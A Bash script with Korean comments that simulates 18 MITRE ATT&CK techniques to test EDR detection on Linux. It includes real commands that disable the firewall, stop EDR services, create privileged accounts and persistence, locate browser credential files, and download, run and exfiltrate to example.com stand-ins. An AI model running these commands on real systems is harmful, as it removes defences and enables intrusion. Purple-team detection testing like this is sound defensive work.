#!/bin/bash

# --- 스크립트 설정 ---
# 테스트용 임시 디렉토리 설정
TEST_DIR="/tmp/EDR_ATTACK_TEST_$(date +%s)"
# 로그 파일 경로 설정 (TEST_DIR 생성 후에 초기화)
LOG_FILE="" # 초기값은 비워둡니다.

# --- 로그 및 색상 설정 ---
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# --- 함수 정의 ---
log_message() {
    local type="$1"
    local message="$2"
    if [ -n "$LOG_FILE" ]; then # LOG_FILE 변수가 비어있지 않은 경우에만 파일에 씁니다.
        echo -e "${type} ${message}${NC}" | tee -a "$LOG_FILE"
    else
        echo -e "${type} ${message}${NC}" # LOG_FILE이 없으면 화면에만 출력합니다.
    fi
}

run_command() {
    local command="$1"
    local description="$2"
    log_message "${YELLOW}[실행 중]${NC}" "${description} (${command})"
    
    # 명령어 실행 결과를 LOG_FILE에 기록하거나, 없으면 화면에만 출력
    # 명령어 자체의 오류는 2>&1로 파이프에 넘겨 log_message로 표시하고, 성공/실패만 eval의 $?로 판단.
    # 단, 명령어의 stdout/stderr는 tee를 통해 로그 파일과 화면에 동시 출력
    local output
    output=$(eval "$command" 2>&1)
    local status=$?

    if [ -n "$LOG_FILE" ]; then
        echo "$output" | tee -a "$LOG_FILE"
    else
        echo "$output"
    fi

    if [ $status -eq 0 ]; then
        log_message "${GREEN}[성공]${NC}" "${description}"
    else
        log_message "${RED}[실패]${NC}" "${description}"
    fi
}

# cleanup 함수는 LOG_FILE이 삭제되기 전에 메시지를 화면에만 출력하도록 수정
cleanup() {
    # LOG_FILE이 삭제되기 전에 메시지를 화면에만 출력
    echo -e "${YELLOW}[정리 중]${NC} 테스트 디렉토리 및 잔여 파일 삭제: ${TEST_DIR}"
    rm -rf "$TEST_DIR"
    echo -e "${GREEN}[완료]${NC} 정리 완료."
    echo -e "${YELLOW}[정리 안내]${NC} 생성된 계정, 서비스, 크론탭 작업은 이 스크립트가 자동으로 삭제하지 않습니다. 수동으로 삭제해야 합니다."
}

# Ctrl+C (SIGINT) 시 cleanup 함수 호출
trap cleanup EXIT

# --- 메인 스크립트 시작 ---
echo -e "${RED}!!! 경고: 이 스크립트는 실제 공격 행위를 모방하므로, 반드시 테스트 환경에서만 실행하세요 !!!${NC}"
echo -e "${RED}!!! 이 스크립트 실행 후에는 수동으로 생성된 계정, 서비스, 크론탭, 방화벽 설정을 삭제해야 합니다. !!!${NC}"
sleep 5

# 첫 번째: 테스트 디렉토리 생성 (로그 파일 생성 전에 먼저 실행)
echo -e "${GREEN}[시작]${NC} 테스트 디렉토리 생성: ${TEST_DIR}"
mkdir -p "$TEST_DIR"
if [ ! -d "$TEST_DIR" ]; then
    echo -e "${RED}[오류]${NC} 테스트 디렉토리 생성 실패. 스크립트를 종료합니다."
    exit 1
fi

# 이제 로그 파일 경로를 설정하고, 이전 메시지를 로그에 다시 기록
LOG_FILE="$TEST_DIR/edr_test_log.txt"
echo -e "${RED}!!! 경고: 이 스크립트는 실제 공격 행위를 모방하므로, 반드시 테스트 환경에서만 실행하세요 !!!${NC}" > "$LOG_FILE"
echo -e "${RED}!!! 이 스크립트 실행 후에는 수동으로 생성된 계정, 서비스, 크론탭, 방화벽 설정을 삭제해야 합니다. !!!${NC}" >> "$LOG_FILE"
echo -e "${GREEN}[시작]${NC} 테스트 디렉토리 생성: ${TEST_DIR}" >> "$LOG_FILE"
echo -e "${GREEN}[성공]${NC} 테스트 디렉토리 생성 (mkdir -p ${TEST_DIR})" >> "$LOG_FILE"


# --- MITRE ATT&CK 기반 모의 공격 실행 ---
# sudo 권한이 필요한 테스트는 별도로 명시합니다.

# 1. T1059.004 - Command and Scripting Interpreter: Bash (기본 명령어 실행)
log_message "${GREEN}[테스트 1]${NC}" "T1059.004 - Bash 명령어 실행 (정보 수집)"
run_command "whoami > $TEST_DIR/whoami.txt" "whoami 실행"
run_command "hostname >> $TEST_DIR/hostname.txt" "hostname 실행"
run_command "id >> $TEST_DIR/id.txt" "id 실행" # id 명령 추가

# 2. T1083 - File and Directory Discovery (파일 탐색)
log_message "${GREEN}[테스트 2]${NC}" "T1083 - 파일 및 디렉토리 탐색 (중요 파일 위치 확인)"
run_command "find /home -maxdepth 2 -type f > $TEST_DIR/found_home_files.txt" "find /home 실행"
run_command "find /var/log -type f > $TEST_DIR/found_log_files.txt" "find /var/log 실행"

# 3. T1027 - Obfuscated Files or Information (난독화된 명령어 실행)
log_message "${GREEN}[테스트 3]${NC}" "T1027 - 난독화된 명령어 실행 (Base64 인코딩)"
if command -v python3 &> /dev/null; then
    # Base64 인코딩된 문자열을 수정하여 /tmp/hidden_message.txt 에 저장하도록 변경
    # 'echo Hidden message > /tmp/hidden_message.txt'를 Base64 인코딩한 결과:
    # ZWNobyAnSGlkZGVuIG1lc3NhZ2UnID4gL3RtcC9oaWRkZW5fbWVzc2FnZS50eHQ=
    run_command "python3 -c \"import base64; import os; os.system(base64.b64decode(b'ZWNobyAnSGlkZGVuIG1lc3NhZ2UnID4gL3RtcC9oaWRkZW5fbWVzc2FnZS50eHQ=').decode('utf-8'))\"" "Python Base64 실행"
    log_message "${YELLOW}[정보]${NC}" "T3 테스트는 '/tmp/hidden_message.txt' 파일 생성 시도를 모의합니다. EDR은 Base64 명령 실행 자체를 탐지해야 합니다."
else
    log_message "${YELLOW}[경고]${NC}" "Python3가 설치되어 있지 않아 Base64 난독화 테스트를 건너뜍니다."
fi

# 4. T1098 - Account Manipulation (계정 조작 - 신규 계정 생성 시도)
log_message "${GREEN}[테스트 4]${NC}" "T1098 - 계정 조작 (신규 계정 생성 시도) - ${RED}sudo 필요!${NC}"
log_message "${YELLOW}[경고]${NC}" "이 테스트는 'EDRTestUser_linux' 계정을 생성합니다. 테스트 후 수동 삭제해야 합니다."
if ! id "EDRTestUser_linux" &>/dev/null; then
    run_command "sudo useradd -m EDRTestUser_linux" "테스트 계정 생성 시도"
else
    log_message "${YELLOW}[정보]${NC}" "'EDRTestUser_linux' 계정이 이미 존재합니다. 생성 시도 건너뜁니다."
fi
run_command "sudo usermod -aG wheel EDRTestUser_linux" "테스트 계정을 wheel 그룹에 추가 시도"

# 5. T1049 - System Network Connections Discovery (네트워크 연결 탐색)
log_message "${GREEN}[테스트 5]${NC}" "T1049 - 시스템 네트워크 연결 탐색"
run_command "netstat -tulnp > $TEST_DIR/netstat_output.txt 2>/dev/null || ss -tulnp > $TEST_DIR/netstat_output.txt" "netstat/ss 실행"

# 6. T1543.002 - Create or Modify System Process: Systemd Service (Systemd 서비스 생성 시도)
log_message "${GREEN}[테스트 6]${NC}" "T1543.002 - Systemd 서비스 생성 시도 (영속성) - ${RED}sudo 필요!${NC}"
log_message "${YELLOW}[경고]${NC}" "이 테스트는 'edr-test.service'를 등록합니다. 테스트 후 수동 삭제해야 합니다."
SERVICE_FILE_PATH="/etc/systemd/system/edr-test.service" # 서비스 파일은 root 권한으로 직접 생성할 위치
echo "[Unit]
Description=EDR Test Service
After=network.target

[Service]
ExecStart=/bin/bash -c \"echo 'EDR Test Service running' > $TEST_DIR/edr-test-service.log\"
Restart=always

[Install]
WantedBy=multi-user.target
" | sudo tee "$SERVICE_FILE_PATH" > /dev/null # sudo tee를 사용하여 root 권한으로 파일 생성

run_command "sudo systemctl daemon-reload" "systemctl daemon-reload 실행"
run_command "sudo systemctl enable edr-test.service" "systemctl enable 실행"
run_command "sudo systemctl start edr-test.service" "systemctl start 실행"

# 7. T1053.003 - Scheduled Task/Job: Cron Job (Crontab 등록 시도)
log_message "${GREEN}[테스트 7]${NC}" "T1053.003 - Crontab 작업 등록 시도 (영속성)"
log_message "${YELLOW}[경고]${NC}" "이 테스트는 크론탭에 'EDR Test Cron Job'을 등록합니다. 테스트 후 수동 삭제해야 합니다."
CRON_JOB_IDENTIFIER="EDR Test Cron Job executed" # 클린업 스크립트와 동기화
CRON_JOB="@reboot echo '$CRON_JOB_IDENTIFIER' >> $TEST_DIR/cron_output.txt"
if ! crontab -l 2>/dev/null | grep -q "$CRON_JOB_IDENTIFIER"; then
    run_command "(crontab -l 2>/dev/null; echo \"$CRON_JOB\") | crontab -" "Crontab 등록 시도"
else
    log_message "${YELLOW}[정보]${NC}" "크론탭에 'EDR Test Cron Job'이 이미 존재합니다. 추가 시도 건너뜍니다."
fi


# 8. T1489 - Service Stop (서비스 중지)
log_message "${GREEN}[테스트 8]${NC}" "T1489 - 서비스 중지 시도 (${RED}주의 필요!${NC})"
log_message "${YELLOW}[경고]${NC}" "존재하지 않는 서비스 ('nonexistent-test-service') 중지 시도. EDR은 이러한 시도를 탐지할 수 있습니다."
run_command "sudo systemctl stop nonexistent-test-service" "존재하지 않는 서비스 중지 시도"

# 9. T1562.001 - Impair Defenses: Disable or Modify System Firewall (방어 무력화: 방화벽 비활성화/수정)
log_message "${GREEN}[테스트 9]${NC}" "T1562.001 - 방화벽 비활성화/수정 시도 (${RED}주의 필요!${NC})"
log_message "${YELLOW}[경고]${NC}" "이 테스트는 방화벽 설정을 변경하려 시도합니다. 시스템 보안에 영향을 미칠 수 있습니다."
run_command "sudo systemctl stop firewalld" "firewalld 서비스 중지 시도" # 방화벽 중지
run_command "sudo iptables -P INPUT ACCEPT" "iptables 기본 정책 변경 시도" # iptables 정책 변경
run_command "sudo iptables -F" "iptables 규칙 초기화 시도" # iptables 규칙 초기화

# 10. T1136.001 - Create Account: Local Account (로컬 계정 생성 - 다른 방식)
log_message "${GREEN}[테스트 10]${NC}" "T1136.001 - 로컬 계정 생성 (다른 방식) - ${RED}sudo 필요!${NC}"
log_message "${YELLOW}[경고]${NC}" "이 테스트는 'TestUser2' 계정을 생성합니다. 테스트 후 수동 삭제해야 합니다."
if ! id "TestUser2" &>/dev/null; then
    if [ "$(command -v useradd)" ]; then
        run_command "sudo useradd TestUser2" "useradd TestUser2 실행"
    elif [ "$(command -v adduser)" ]; then
        run_command "sudo adduser TestUser2 --disabled-password --gecos \"\"" "adduser TestUser2 실행"
    else
        log_message "${YELLOW}[경고]${NC}" "useradd/adduser 명령을 찾을 수 없어 계정 생성 테스트를 건너뜍니다."
    fi

    if command -v passwd &> /dev/null; then
        run_command "sudo passwd TestUser2 --stdin <<< 'Password!1'" "TestUser2 비밀번호 설정"
    fi

    if [ "$(command -v usermod)" ]; then
        run_command "sudo usermod -aG wheel TestUser2" "TestUser2를 wheel 그룹에 추가"
    fi
else
    log_message "${YELLOW}[정보]${NC}" "'TestUser2' 계정이 이미 존재합니다. 생성 시도 건너뜍니다."
fi

# --- 새로운 강화된 테스트 추가 ---

# 11. T1562.001 - Impair Defenses: EDR 서비스/프로세스 직접 조회 및 중단 시도
log_message "${GREEN}[테스트 11]${NC}" "T1562.001 - EDR 서비스/프로세스 직접 조회 및 중단 시도 (${RED}매우 주의 필요!${NC})"
log_message "${YELLOW}[경고]${NC}" "이 테스트는 실제 EDR 서비스 이름을 가정하며, EDR에 따라 다를 수 있습니다. 실제 EDR 서비스 이름을 입력해야 합니다."

# 흔히 사용되는 EDR 관련 키워드
# 실제 환경의 EDR 이름이나 관련 프로세스/서비스 이름을 이 목록에 추가하세요.
EDR_KEYWORDS=("EDR" "carbonblack" "crowdstrike" "sentinelone" "microsoft-defender" "mde" "falcon" "tanium" "qualys" "cylance" "trellix" "trendmicro")

# EDR 관련 프로세스 탐색 및 기록
for keyword in "${EDR_KEYWORDS[@]}"; do
    log_message "${YELLOW}[실행 중]${NC}" "EDR 관련 프로세스 탐색 (keyword: $keyword)"
    # grep -v grep 으로 grep 프로세스 자체는 제외
    run_command "sudo ps aux | grep -i \"$keyword\" | grep -v grep > $TEST_DIR/edr_proc_${keyword}.txt" "프로세스 '$keyword' 탐색"
done

# EDR 관련 서비스 탐색 및 기록 (systemd)
for keyword in "${EDR_KEYWORDS[@]}"; do
    log_message "${YELLOW}[실행 중]${NC}" "EDR 관련 서비스 탐색 (keyword: $keyword)"
    run_command "sudo systemctl list-units --type=service --all | grep -i \"$keyword\" > $TEST_DIR/edr_svc_${keyword}.txt" "서비스 '$keyword' 탐색"
done

# (주의) EDR 서비스 강제 중지 시도 (실제 EDR 서비스 이름을 정확히 알아야 함)
# 아래 'EDR_SERVICE_CANDIDATES' 배열에 여러분의 EDR 서비스 이름을 추가하세요.
# 예시: EDR_SERVICE_CANDIDATES=("carbonblack.service" "csfalcon.service" "sense.service")
# 이는 실제 서비스 중단을 시도하므로, 시스템에 따라 심각한 문제를 야기할 수 있습니다.
EDR_SERVICE_CANDIDATES=("hypothetical-edr-service.service" "another-edr-agent.service") # <-- 실제 EDR 서비스 이름으로 변경하세요!

for svc_name in "${EDR_SERVICE_CANDIDATES[@]}"; do
    if sudo systemctl list-units --type=service --all | grep -q "$svc_name"; then
        log_message "${YELLOW}[실행 중]${NC}" "실제 EDR 서비스 중지 시도 (서비스: $svc_name)"
        run_command "sudo systemctl stop $svc_name" "서비스 $svc_name 중지 시도"
        run_command "sudo systemctl disable $svc_name" "서비스 $svc_name 비활성화 시도"
    else
        log_message "${YELLOW}[정보]${NC}" "가상 EDR 서비스 $svc_name 이 존재하지 않아 중지 시도 건너뜁니다."
    fi
done

# 12. T1105 / T1204.002 - 가상 악성 실행 파일 다운로드 및 실행 시도 (Ingress Tool Transfer / Malicious File)
log_message "${GREEN}[테스트 12]${NC}" "T1105 / T1204.002 - 가상 악성 실행 파일 다운로드 및 실행 시도"
log_message "${YELLOW}[경고]${NC}" "이 테스트는 존재하지 않는 URL에서 가상 실행 파일을 다운로드 시도합니다. 실제 파일은 다운로드되지 않습니다."

DUMMY_BINARY_URL="https://example.com/malware/evil_payload.bin" # 실제 악성 파일 URL 아님, 가상의 URL
DUMMY_BINARY_PATH="$TEST_DIR/evil_payload.bin"

run_command "curl -sS -L -o $DUMMY_BINARY_PATH $DUMMY_BINARY_URL" "가상 악성 파일 다운로드 시도"
# 파일이 다운로드되지 않아도 EDR은 curl 요청과 'evil_payload.bin' 이라는 이름을 탐지할 수 있음.
if [ -f "$DUMMY_BINARY_PATH" ]; then # 다운로드 성공 시 (예상치 못한 경우)
    run_command "chmod +x $DUMMY_BINARY_PATH" "다운로드된 파일에 실행 권한 부여"
    run_command "$DUMMY_BINARY_PATH" "다운로드된 파일 실행 시도" # 실행 실패해도 EDR 탐지 목적
else
    log_message "${YELLOW}[정보]${NC}" "가상 악성 파일($DUMMY_BINARY_URL) 다운로드에 실패했습니다. (URL이 존재하지 않으므로 예상된 결과)"
fi

# 13. T1105 - 공격 도구/라이브러리 설치 시도 (Ingress Tool Transfer)
log_message "${GREEN}[테스트 13]${NC}" "T1105 - 공격 도구/라이브러리 설치 시도 (${RED}sudo 필요!${NC})"
log_message "${YELLOW}[경고]${NC}" "이 테스트는 실제 패키지를 설치하려 시도할 수 있습니다. EDR은 패키지 설치 행위와 특정 도구 이름을 탐지할 수 있습니다."

# 패키지 관리자에 따른 설치 시도 (nmap, netcat 등)
if command -v dnf &> /dev/null; then # Rocky Linux/CentOS
    run_command "sudo dnf install -y nmap netcat-traditional" "dnf로 nmap, netcat 설치 시도"
elif command -v apt &> /dev/null; then # Ubuntu/Debian
    run_command "sudo apt update && sudo apt install -y nmap netcat-traditional" "apt로 nmap, netcat 설치 시도"
else
    log_message "${YELLOW}[경고]${NC}" "적절한 패키지 관리자(dnf/apt)를 찾을 수 없어 도구 설치 테스트를 건너뜍니다."
fi

# Python pip를 사용한 라이브러리 설치 시도 (impacket, scapy 등)
if command -v pip3 &> /dev/null; then
    run_command "pip3 install impacket-secretsdump scapy" "pip3로 impacket, scapy 설치 시도"
elif command -v pip &> /dev/null; then
    run_command "pip install impacket-secretsdump scapy" "pip로 impacket, scapy 설치 시도"
else
    log_message "${YELLOW}[경고]${NC}" "pip가 설치되어 있지 않아 Python 라이브러리 설치 테스트를 건너뜍니다."
fi

# 14. T1574.006 - Dynamic-Link Library Injection (Preload) (LD_PRELOAD 환경 변수 주입 시도)
log_message "${GREEN}[테스트 14]${NC}" "T1574.006 - LD_PRELOAD 환경 변수 주입 시도 (${RED}매우 주의 필요!${NC})"
log_message "${YELLOW}[경고]${NC}" "이 테스트는 LD_PRELOAD를 사용하여 임의의 라이브러리 로딩을 시도합니다. 이는 EDR에게 매우 민감한 행위입니다."
# 실제 악성 라이브러리 대신 존재하지 않는 라이브러리를 지정하여 시도 (탐지 목적)
run_command "LD_PRELOAD=/tmp/evil_lib.so /bin/ls" "LD_PRELOAD 주입 시도 (ls)"
run_command "LD_PRELOAD=/etc/passwd /bin/cat" "LD_PRELOAD 주입 시도 (cat - 존재하지 않는 lib)" # 실제 악성 lib 대신 사용
log_message "${YELLOW}[정보]${NC}" "LD_PRELOAD 테스트는 라이브러리 로딩 실패로 끝날 수 있으나, 환경 변수 조작 시도 자체를 EDR이 탐지해야 합니다."


# 15. T1036.003 - Masquerading: Rename System Utilities (시스템 유틸리티 이름 변경 시도)
log_message "${GREEN}[테스트 15]${NC}" "T1036.003 - 시스템 유틸리티 이름 변경 시도 (${RED}매우 주의 필요!${NC})"
log_message "${YELLOW}[경고]${NC}" "이 테스트는 시스템 유틸리티를 복사하여 이름 변경을 시도합니다. 실제 시스템에 영향을 주지 않기 위해 /tmp에 복사합니다."
run_command "sudo cp /bin/ls $TEST_DIR/l_s" "ls를 l_s로 복사 시도"
run_command "sudo cp /usr/bin/python3 $TEST_DIR/my_py" "python3를 my_py로 복사 시도"
run_command "$TEST_DIR/l_s -la $TEST_DIR" "복사된 ls(l_s) 실행 시도"
run_command "$TEST_DIR/my_py -c 'print(\"Hello from renamed python\")'" "복사된 python(my_py) 실행 시도"


# 16. T1555.003 - Credentials from Web Browsers (웹 브라우저 자격 증명 파일 탐색 시도)
log_message "${GREEN}[테스트 16]${NC}" "T1555.003 - 웹 브라우저 자격 증명 파일 탐색 시도"
log_message "${YELLOW}[경고]${NC}" "이 테스트는 웹 브라우저의 프로필 디렉토리를 탐색합니다. 실제 자격 증명은 훔치지 않습니다."
# 일반적인 브라우저 프로필 경로 탐색
run_command "find ~/.mozilla/firefox/ -name \"*.sqlite\" -print0 | xargs -0 ls -l > $TEST_DIR/firefox_profiles.txt 2>/dev/null" "Firefox 프로필 파일 탐색"
run_command "find ~/.config/google-chrome/ -name \"*Login Data*\" -print0 | xargs -0 ls -l > $TEST_DIR/chrome_profiles.txt 2>/dev/null" "Chrome 프로필 파일 탐색"


# 17. T1560.001 - Archive via Utility: Tar (Tar를 이용한 데이터 압축 시도)
log_message "${GREEN}[테스트 17]${NC}" "T1560.001 - Tar를 이용한 데이터 압축 시도 (데이터 유출 준비 모의)"
log_message "${YELLOW}[경고]${NC}" "이 테스트는 /var/log 디렉토리를 압축합니다. 실제 데이터 유출은 발생하지 않습니다."
run_command "sudo tar -cvf $TEST_DIR/logs.tar /var/log" "로그 디렉토리 압축 시도"
run_command "sudo gzip $TEST_DIR/logs.tar" "압축 파일 gzip 압축 시도"


# 18. T1071.001 - Application Layer Protocol: Web Protocols (HTTP를 이용한 데이터 유출 모의)
log_message "${GREEN}[테스트 18]${NC}" "T1071.001 - HTTP를 이용한 데이터 유출 모의"
log_message "${YELLOW}[경고]${NC}" "이 테스트는 웹 서버로 더미 데이터를 전송하려 시도합니다. 실제 유출은 발생하지 않습니다."
DUMMY_EXFIL_SERVER="http://example.com/upload" # 가상의 데이터 수신 서버 URL
DUMMY_DATA="$TEST_DIR/dummy_data.txt"
echo "This is some dummy data to simulate exfiltration." > "$DUMMY_DATA"
run_command "curl -sS -X POST -H \"Content-Type: text/plain\" --data-binary @$DUMMY_DATA $DUMMY_EXFIL_SERVER" "curl을 이용한 데이터 유출 모의"
run_command "curl -sS -X POST -F \"file=@$DUMMY_DATA\" $DUMMY_EXFIL_SERVER" "curl을 이용한 파일 업로드 유출 모의"


log_message "${GREEN}[완료]${NC}" "모든 EDR 탐지 테스트 스크립트 실행 완료."
log_message "${YELLOW}[정리 안내]${NC}" "생성된 파일 및 디렉토리, 계정, 서비스, 크론탭 작업은 이 스크립트가 자동으로 삭제하지 않습니다. 수동으로 삭제해야 합니다."

exit 0
